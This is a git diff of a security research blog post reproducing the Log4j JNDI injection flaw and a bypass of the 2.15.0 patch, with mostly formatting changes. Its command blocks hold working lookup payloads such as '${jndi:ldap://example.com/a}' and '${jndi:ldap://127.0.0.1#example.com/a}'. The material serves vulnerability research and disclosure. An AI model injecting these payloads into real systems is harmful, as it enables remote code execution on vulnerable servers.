@@ -14,6 +14,7 @@ This blog goes over the research we performed from start to finish to produce a 
 
 To start with, we downloaded the vulnerable 2.14.1 log4j library, as well as the patched 2.15.0:
 
+{: .no-stripes}
 ```bash
 user@ubuntu:~/poc$ wget -q https://archive.apache.org/dist/logging/log4j/2.14.1/apache-log4j-2.14.1-src.tar.gz
 user@ubuntu:~/poc$ tar zxf apache-log4j-2.14.1-src.tar.gz 
@@ -174,6 +175,7 @@ public class POC {
 
 After that we compiled it and ran it:
 
+{: .no-stripes}
 ```bash
 user@ubuntu:~/poc$ ./jdk1.8.0_171/bin/javac -cp apache-log4j-2.15.0-bin/log4j-core-2.15.0.jar:apache-log4j-2.15.0-bin/log4j-api-2.15.0.jar POC.java 
 user@ubuntu:~/poc$ ./jdk1.8.0_171/bin/java -cp apache-log4j-2.15.0-bin/log4j-core-2.15.0.jar:apache-log4j-2.15.0-bin/log4j-api-2.15.0.jar:. POC '${jndi:dns://test.example.com}'
@@ -193,7 +195,7 @@ With this in mind, we had to create a config file with a custom pattern and use 
 
 * Create a log4j2.xml configuration file in the same folder as the POC code.
 
-```markup
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <Configuration status="WARN">
     <Appenders>
@@ -231,6 +233,7 @@ public class POC {
 
 With these changes, we decided to test again with a slightly modified payload:
 
+{: .no-stripes}
 ```bash
 user@ubuntu:~/poc$ ./jdk1.8.0_171/bin/java -cp log4j-core-2.15.0.jar:log4j-api-2.15.0.jar:. POC '${jndi:ldap://example.com/a'}
 Using payload: ${jndi:ldap://example.com/a}
@@ -240,6 +243,7 @@ Using payload: ${jndi:ldap://example.com/a}
 
 We then ran it again to verify that we can use the other enabled protocols as well:
 
+{: .no-stripes}
 ```bash
 user@ubuntu:~/poc$ ./jdk1.8.0_171/bin/java -cp log4j-core-2.15.0.jar:log4j-api-2.15.0.jar:. POC '${java:version}'
 Using payload: ${java:version}
@@ -254,9 +258,9 @@ We reached a big problem as the [bypass](https://twitter.com/marcioalm/status/14
 
 Here we have a PoC of this:
 
+{: .no-stripes}
 ```bash
-user@ubuntu:~/poc$ ./jdk1.8.0_171/bin/java -cp log4j-core-2.15.0.jar:log4j-api-2.15.0.jar:. \
-> -Dsun.net.spi.nameservice.provider.1=dns,sun POC '${jndi:ldap://127.0.0.1#example.com/a}'
+user@ubuntu:~/poc$ ./jdk1.8.0_171/bin/java -cp log4j-core-2.15.0.jar:log4j-api-2.15.0.jar:. -Dsun.net.spi.nameservice.provider.1=dns,sun POC '${jndi:ldap://127.0.0.1#example.com/a}'
 Using payload: ${jndi:ldap://127.0.0.1#example.com/a}
 2021-12-24 02:45:36,290 main WARN Error looking up JNDI resource [ldap://127.0.0.1#example.com/a]. javax.naming.CommunicationException: 127.0.0.1#example.com:389 [Root exception is java.net.UnknownHostException: 127.0.0.1#example.com]
 [...snip...]
